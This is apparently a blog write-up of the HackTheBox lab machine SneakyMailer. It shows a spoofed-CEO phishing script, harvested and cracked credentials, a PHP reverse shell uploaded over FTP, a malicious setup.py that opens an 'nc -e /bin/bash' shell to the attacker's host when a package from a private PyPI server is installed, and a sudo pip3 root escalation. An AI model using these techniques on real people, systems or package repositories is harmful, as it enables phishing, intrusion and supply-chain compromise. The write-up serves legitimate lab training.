---
layout: post
title: HackTheBox - SneakyMailer
---

## Enumeration
```
root@kali:~# portscan sneakymailer
Open ports: 21,22,25,80,143,993,8080
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-22 18:32 EDT
Nmap scan report for sneakymailer (10.10.10.197)
Host is up (0.075s latency).

PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)
|   256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)
|_  256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519)
25/tcp   open  smtp     Postfix smtpd
|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
80/tcp   open  http     nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Did not follow redirect to http://sneakycorp.htb
143/tcp  open  imap     Courier Imapd (released 2018)
|_imap-capabilities: IMAP4rev1 SORT QUOTA ACL2=UNION CHILDREN THREAD=ORDEREDSUBJECT ACL CAPABILITY completed THREAD=REFERENCES STARTTLS NAMESPACE OK IDLE UTF8=ACCEPTA0001 UIDPLUS ENABLE
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
|_ssl-date: TLS randomness does not represent time
993/tcp  open  ssl/imap Courier Imapd (released 2018)
|_imap-capabilities: UTF8=ACCEPTA0001 SORT QUOTA ACL2=UNION CHILDREN THREAD=ORDEREDSUBJECT ACL CAPABILITY completed THREAD=REFERENCES IMAP4rev1 NAMESPACE OK IDLE ENABLE UIDPLUS AUTH=PLAIN
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
|_ssl-date: TLS randomness does not represent time
8080/tcp open  http     nginx 1.14.2
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.14.2
|_http-title: Welcome to nginx!
Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.17 seconds
```
Update `/etc/hosts`:
```
# Due to |_http-title: Did not follow redirect to http://sneakycorp.htb
root@kali:~# echo "10.10.10.197    sneakycorp.htb" >> /etc/hosts
```

Let's check port 80 first. There appears to be a PyPI server. We land on an Employee Dashboard, automatically logged in. Following the Team link, I can grab a list of all the employees and their emails.

Using https://email-checker.net/email-extractor, we can grab just the emails and save them into an `email_list` file.

```
airisatou@sneakymailer.htb
angelicaramos@sneakymailer.htb
ashtoncox@sneakymailer.htb
bradleygreer@sneakymailer.htb
brendenwagner@sneakymailer.htb
briellewilliamson@sneakymailer.htb
...
```

Since port 25 is open for SMTP, let's try to get a response from someone. `swaks` comes with Kali, and we can use it to phish all the employees on our list into opening a link that will trigger a reverse shell. The employee list also tells us that Angelica Ramos is the CEO, so let's pretend to be her for hopefully better results.

Let's change the last line in `/etc/hosts` to include sneakymailer.htb instead of sneakycorp.htb, so this mail can be sent.

```py3
#!/usr/bin/python3
import os, sys, signal

if len(sys.argv) != 2:
	print("usage: python go_phish.py <email_list>")
	exit()

filename = sys.argv[1]
spoof = 'angelicaramos@sneakymailer.htb'
msg = '"Confirm this data please: http://10.10.14.66:1234"'


with open(filename) as f:
	emails = [line.rstrip() for line in f]

try:
	for email in emails:
		print("Emailing: ", email)
		command = 'swaks --to ' + email + ' --from ' + spoof + ' --body ' + msg + ' > /dev/null'
		os.system(command)
except KeyboardInterrupt:
	print("Bye")
	sys.exit()
```

Let's open up a listener and run the script.
```
root@kali:~/Security/HackTheBox/SneakyMailer# nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.14.66] from (UNKNOWN) [10.10.10.197] 59352
POST / HTTP/1.1
Host: 10.10.14.66:1234
User-Agent: python-requests/2.23.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 185
Content-Type: application/x-www-form-urlencoded

firstName=Paul&lastName=Byrd&email=paulbyrd%40sneakymailer.htb&password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
```

Thanks for the creds, Paul! Let's use https://meyerweb.com/eric/tools/dencoder/ to decode the password.

```
firstName=Paul
&lastName=Byrd
&email=paulbyrd%40sneakymailer.htb
&password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
&rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
------
Name: Paul Byrd
Email: paulbyrd@sneakymailer.htb
Pass: ^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
```

The ```paulbyrd:^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht``` credentials don't work for SSH or FTP. So let's try IMAP on port 993 [Access IMAP server from the command line using OpenSSL](https://tewarid.github.io/2011/05/10/access-imap-server-from-the-command-line-using-openssl.html).

```
$ openssl s_client -connect 10.10.10.197:993 -crlf
...
tag login paulbyrd ^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
...
tag OK LOGIN Ok.
tag LIST "" "*"
* LIST (\Unmarked \HasChildren) "." "INBOX"
* LIST (\HasNoChildren) "." "INBOX.Trash"
* LIST (\HasNoChildren) "." "INBOX.Sent"
* LIST (\HasNoChildren) "." "INBOX.Deleted Items"
* LIST (\HasNoChildren) "." "INBOX.Sent Items"
tag OK LIST completed
```
Searching through, only "INBOX.Sent Items" has contents.
```
tag SELECT "INBOX.Sent Items"
* FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent)
* OK [PERMANENTFLAGS (\* \Draft \Answered \Flagged \Deleted \Seen)] Limited
* 2 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 589480766] Ok
* OK [MYRIGHTS "acdilrsw"] ACL
tag OK [READ-WRITE] Ok
```
Let's check the messages:
```
tag FETCH 1:2 (BODY[HEADER])
* 1 FETCH (BODY[HEADER] {279}
MIME-Version: 1.0
To: root <root@debian>
From: Paul Byrd <paulbyrd@sneakymailer.htb>
Subject: Password reset
Date: Fri, 15 May 2020 13:03:37 -0500
Importance: normal
X-Priority: 3
Content-Type: multipart/alternative;
	boundary="_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_"

)
* 2 FETCH (BODY[HEADER] {419}
To: low@debian
From: Paul Byrd <paulbyrd@sneakymailer.htb>
Subject: Module testing
Message-ID: <4d08007d-3f7e-95ee-858a-40c6e04581bb@sneakymailer.htb>
Date: Wed, 27 May 2020 13:28:58 -0400
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101
 Thunderbird/68.8.0
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8; format=flowed
Content-Transfer-Encoding: 7bit
Content-Language: en-US

)
tag OK FETCH completed.
```
The first seems more promising based on the Subject.
```
tag FETCH 1 BODY.PEEK()
tag NO Error in IMAP command received by server.
tag FETCH 1 BODY.PEEK[]
* 1 FETCH (BODY[] {2167}
MIME-Version: 1.0
To: root <root@debian>
From: Paul Byrd <paulbyrd@sneakymailer.htb>
Subject: Password reset
Date: Fri, 15 May 2020 13:03:37 -0500
Importance: normal
X-Priority: 3
Content-Type: multipart/alternative;
	boundary="_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_"

--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_
Content-Transfer-Encoding: quoted-printable
Content-Type: text/plain; charset="utf-8"

Hello administrator, I want to change this password for the developer accou=
nt

Username: developer
Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C

Please notify me when you do it=20

--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_
Content-Transfer-Encoding: quoted-printable
Content-Type: text/html; charset="utf-8"

<html xmlns:o=3D"urn:schemas-microsoft-com:office:office" xmlns:w=3D"urn:sc=
hemas-microsoft-com:office:word" xmlns:m=3D"http://schemas.microsoft.com/of=
fice/2004/12/omml" xmlns=3D"http://www.w3.org/TR/REC-html40"><head><meta ht=
tp-equiv=3DContent-Type content=3D"text/html; charset=3Dutf-8"><meta name=
=3DGenerator content=3D"Microsoft Word 15 (filtered medium)"><style><!--
/* Font Definitions */
@font-face
	{font-family:"Cambria Math";
	panose-1:2 4 5 3 5 4 6 3 2 4;}
@font-face
	{font-family:Calibri;
	panose-1:2 15 5 2 2 2 4 3 2 4;}
/* Style Definitions */
p.MsoNormal, li.MsoNormal, div.MsoNormal
	{margin:0in;
	margin-bottom:.0001pt;
	font-size:11.0pt;
	font-family:"Calibri",sans-serif;}
.MsoChpDefault
	{mso-style-type:export-only;}
@page WordSection1
	{size:8.5in 11.0in;
	margin:1.0in 1.0in 1.0in 1.0in;}
div.WordSection1
	{page:WordSection1;}
--></style></head><body lang=3DEN-US link=3Dblue vlink=3D"#954F72"><div cla=
ss=3DWordSection1><p class=3DMsoNormal>Hello administrator, I want to chang=
e this password for the developer account</p><p class=3DMsoNormal><o:p>&nbs=
p;</o:p></p><p class=3DMsoNormal>Username: developer</p><p class=3DMsoNorma=
l>Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C</p><p class=3DMsoNorm=
al><o:p>&nbsp;</o:p></p><p class=3DMsoNormal>Please notify me when you do i=
t </p></div></body></html>=

--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_--
)
tag OK FETCH completed.
```
Here are some old(?) developer credentials: `developer:m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C`.

```
tag FETCH 2 BODY.PEEK[]
* 2 FETCH (BODY[] {585}
To: low@debian
From: Paul Byrd <paulbyrd@sneakymailer.htb>
Subject: Module testing
Message-ID: <4d08007d-3f7e-95ee-858a-40c6e04581bb@sneakymailer.htb>
Date: Wed, 27 May 2020 13:28:58 -0400
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101
 Thunderbird/68.8.0
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8; format=flowed
Content-Transfer-Encoding: 7bit
Content-Language: en-US

Hello low


Your current task is to install, test and then erase every python module you 
find in our PyPI service, let me know if you have any inconvenience.

)
tag OK FETCH completed.
```
We know of `root@debian` and `low@debian`, which may come in handy. Let's try the `developer` creds on SSH and FTP.

```
$ ftp sneakymailer.htb 
Connected to sneakymailer.htb.
220 (vsFTPd 3.0.3)
Name (sneakymailer.htb:root): developer
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxr-x    8 0        1001         4096 Jun 30 01:15 dev
226 Directory send OK.
ftp> cd dev
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 May 26 19:52 css
drwxr-xr-x    2 0        0            4096 May 26 19:52 img
-rwxr-xr-x    1 0        0           13742 Jun 23 09:44 index.php
drwxr-xr-x    3 0        0            4096 May 26 19:52 js
drwxr-xr-x    2 0        0            4096 May 26 19:52 pypi
drwxr-xr-x    4 0        0            4096 May 26 19:52 scss
-rwxr-xr-x    1 0        0           26523 May 26 20:58 team.php
drwxr-xr-x    8 0        0            4096 May 26 19:52 vendor
226 Directory send OK.
```
## Gaining Access

SSH fails, but we're in FTP. Because of the mention of the Python modules in PyPI, let's navigate there.
```
ftp> cd pypi
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0            3115 May 26 19:52 register.php
226 Directory send OK.
```
It appears like there is only a PHP file. We can use `get` to download all the files. However, there doesn't appear to be much worth anything. So let's run a reverse shell from pentestmonkey.

```
ftp> pwd
257 "/dev" is the current directory
ftp> put rshell.php
local: rshell.php remote: rshell.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
5491 bytes sent in 0.00 secs (20.5358 MB/s)
```
Navigating to http://sneakycorp.htb/rshell.php gives us a 404, so maybe there is a subdomain.

```
$ wfuzz -H "HOST: FUZZ.sneakycorp.htb" -u http://10.10.10.197 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
# This had a lot of results, so to limit the space hide the codes of 185 characters with the -hh flag
$ wfuzz -H "HOST: FUZZ.sneakycorp.htb" -u http://10.10.10.197 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -hh 185
...
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.197/
Total requests: 220560

===================================================================
ID           Response   Lines    Word     Chars       Payload            
===================================================================

000000009:   400        7 L      12 W     173 Ch      "# Suite 300, San F
                                                      rancisco, Californi
                                                      a, 94105, USA."    
000000007:   400        7 L      12 W     173 Ch      "# license, visit h
                                                      ttp://creativecommo
                                                      ns.org/licenses/by-
                                                      sa/3.0/"           
000000834:   200        340 L    989 W    13737 Ch    "dev"              
000006304:   301        7 L      12 W     185 Ch      "Christmas" 
...
```

The `dev` subdomain... should've guessed. Add `dev.sneakycorp.htb` to our `/etc/hosts`, then navigate to: http://dev.sneakycorp.htb/rshell.php to open the shell.

## Privilege Escalation

Just to make stuff easier on ourselves, let's spawn a TTY shell and see if we can `su` to the developer user.
```
$ whoami
www-data
$ python -c 'import pty; pty.spawn("/bin/sh")'
$ su developer
su developer
Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C

developer@sneakymailer:/$
```
The user flag is in /home/low but we don't have permissions to read it. Let's check `www-data`'s pseudo-home `/var/www/html`. There is only a nginx default html page. What about up a directory?
```
developer@sneakymailer:/var/www$ ls
ls
dev.sneakycorp.htb  html  pypi.sneakycorp.htb  sneakycorp.htb
developer@sneakymailer:/var/www$ cd pypi.sneakycorp.htb
cd pypi.sneakycorp.htb
developer@sneakymailer:/var/www/pypi.sneakycorp.htb$ ls -a
ls -a
.  ..  .htpasswd  packages  venv

developer@sneakymailer:/var/www/pypi.sneakycorp.htb$ cat .htpasswd
cat .htpasswd
pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/
```
Before we go any further, let's crack the password:
```
john pypi.hash --wordlist=/usr/share/wordlists/rockyou.txt
...
soufianeelhaoui  (pypi)
...
```
New, credentials: `pypi:soufianeelhaoui`. Per the email for `low`, PyPI modules will be installed and tested by user `low`. If we upload something, we could potentially get a shell with `low` permissions.

Reading through some PyPI Server docs [here](https://pypi.org/project/pypiserver/), we can find a way to upload with `setuptools`.

```
# On client-side, edit or create a ~/.pypirc file with a similar content:

[distutils]
index-servers =
  pypi
  local

[pypi]
username:<your_pypi_username>
password:<your_pypi_passwd>

[local]
repository: http://localhost:8080
username: <some_username>
password: <some_passwd>

# Then from within the directory of the python-project you wish to upload, issue this command:

python setup.py sdist upload -r local
```
We need two files, `.pypirc` and `setup.py`.

So, here's our `.pypirc`:
```
[distutils]
index-servers = local

[local]
repository: http://pypi.sneakycorp.htb:8080
username: pypi
password: soufianeelhaoui
```                                                                           
And here's our `setup.py`:
```
# from https://packaging.python.org/tutorials/packaging-projects/
import setuptools
import os

# Reverse Shell
os.system('nc -e /bin/bash 10.10.14.66 4444')

setuptools.setup(
    name="example-pkg-YOUR-USERNAME-HERE", # Replace with your own username
    version="0.0.1",
    author="Example Author",
    author_email="author@example.com",
    description="A small example package",
    long_description=long_description,
    long_description_content_type="text/markdown",
    url="https://github.com/pypa/sampleproject",
    packages=setuptools.find_packages(),
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
)
```
Host the files with `python3 -m http.server` and `wget` them. FTP could also potentially work. Since permission is denied in /var/www/pypi.sneakycorp.htb/packages, we have to create our package outside of it.
```
# Attacker
root@kali:~/Security/HackTheBox/SneakyMailer# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.197 - - [31/Aug/2020 19:55:27] "GET /setup.py HTTP/1.1" 200 -
10.10.10.197 - - [31/Aug/2020 19:56:07] "GET /.pypirc HTTP/1.1" 200 -

# Victim
developer@sneakymailer:/tmp$ mkdir pypi && cd $_
developer@sneakymailer:/tmp/pypi$ wget http://10.10.14.66:8000/setup.py
wget http://10.10.14.66:8000/setup.py
--2020-08-31 20:06:53--  http://10.10.14.66:8000/setup.py
Connecting to 10.10.14.66:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 734 [text/plain]
Saving to: ‘setup.py’

setup.py            100%[===================>]     734  --.-KB/s    in 0s      

2020-08-31 20:06:53 (140 MB/s) - ‘setup.py’ saved [734/734]

developer@sneakymailer:/tmp/pypi$ wget http://10.10.14.66:8000/.pypirc
wget http://10.10.14.66:8000/.pypirc
--2020-08-31 20:07:33--  http://10.10.14.66:8000/.pypirc
Connecting to 10.10.14.66:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 128 [application/octet-stream]
Saving to: ‘.pypirc’

.pypirc              100%[===================>]     128  --.-KB/s    in 0s      

2020-08-31 20:07:33 (4.46 MB/s) - ‘.pypirc’ saved [128/128]

```
Next, we change the HOME environment and make `setup.py` executable.
```
developer@sneakymailer:/tmp/pypi$ chmod +x setup.py
developer@sneakymailer:/tmp/pypi$ HOME=$(pwd)
developer@sneakymailer:~$ python3 setup.py sdist register -r local upload -r local
...
```
This gives a developer shell, whoops! Let's modify `setup.py` to only run when the userid is correct.
```
developer@sneakymailer:~$ grep low /etc/passwd
grep low /etc/passwd
low:x:1000:1000:,,,:/home/low:/bin/bash
```
So, we add this `if` into our `setup.py`:
```
...
# Reverse Shell
if os.getuid() == 1000:
	os.system('nc -e /bin/bash 10.10.14.66 4444')
...
```
Re-`wget` our setup script and rerun the commands.
```
developer@sneakymailer:~$ python3 setup.py sdist register -r local upload -r local
running sdist
running egg_info
writing example_pkg_YOUR_USERNAME_HERE.egg-info/PKG-INFO
writing dependency_links to example_pkg_YOUR_USERNAME_HERE.egg-info/dependency_links.txt
writing top-level names to example_pkg_YOUR_USERNAME_HERE.egg-info/top_level.txt
reading manifest file 'example_pkg_YOUR_USERNAME_HERE.egg-info/SOURCES.txt'
writing manifest file 'example_pkg_YOUR_USERNAME_HERE.egg-info/SOURCES.txt'
warning: sdist: standard file not found: should have one of README, README.rst, README.txt, README.md

running check
creating example-pkg-YOUR-USERNAME-HERE-0.0.1
creating example-pkg-YOUR-USERNAME-HERE-0.0.1/example_pkg_YOUR_USERNAME_HERE.egg-info
copying files to example-pkg-YOUR-USERNAME-HERE-0.0.1...
copying setup.py -> example-pkg-YOUR-USERNAME-HERE-0.0.1
copying example_pkg_YOUR_USERNAME_HERE.egg-info/PKG-INFO -> example-pkg-YOUR-USERNAME-HERE-0.0.1/example_pkg_YOUR_USERNAME_HERE.egg-info
copying example_pkg_YOUR_USERNAME_HERE.egg-info/SOURCES.txt -> example-pkg-YOUR-USERNAME-HERE-0.0.1/example_pkg_YOUR_USERNAME_HERE.egg-info
copying example_pkg_YOUR_USERNAME_HERE.egg-info/dependency_links.txt -> example-pkg-YOUR-USERNAME-HERE-0.0.1/example_pkg_YOUR_USERNAME_HERE.egg-info
copying example_pkg_YOUR_USERNAME_HERE.egg-info/top_level.txt -> example-pkg-YOUR-USERNAME-HERE-0.0.1/example_pkg_YOUR_USERNAME_HERE.egg-info
Writing example-pkg-YOUR-USERNAME-HERE-0.0.1/setup.cfg
Creating tar archive
removing 'example-pkg-YOUR-USERNAME-HERE-0.0.1' (and everything under it)
running register
Registering example-pkg-YOUR-USERNAME-HERE to http://pypi.sneakycorp.htb:8080
Server response (200): OK
WARNING: Registering is deprecated, use twine to upload instead (https://pypi.org/p/twine/)
running upload
Submitting dist/example-pkg-YOUR-USERNAME-HERE-0.0.1.tar.gz to http://pypi.sneakycorp.htb:8080
Server response (200): OK
WARNING: Uploading via this command is deprecated, use twine to upload instead (https://pypi.org/p/twine/)
```
Checking back on our listener:
```
root@kali:~/Security/HackTheBox/SneakyMailer# nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.66] from (UNKNOWN) [10.10.10.197] 56576
python -c 'import pty; pty.spawn("/bin/sh")'
$ whoami
whoami
low
$ cat ~/user.txt
{censored}
```
## Getting Root

```
$ sudo -l
Matching Defaults entries for low on sneakymailer:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User low may run the following commands on sneakymailer:
    (root) NOPASSWD: /usr/bin/pip3
```
Let's check GTFOBins for a pip3 win.
```
$ TF=$(mktemp -d)
TF=$(mktemp -d)
$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
$ sudo pip3 install $TF
sudo pip3 install $TF
sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
Processing /tmp/tmp.25cA4xw9Lq
# cat /root/root.txt
cat /root/root.txt
{censored}
```
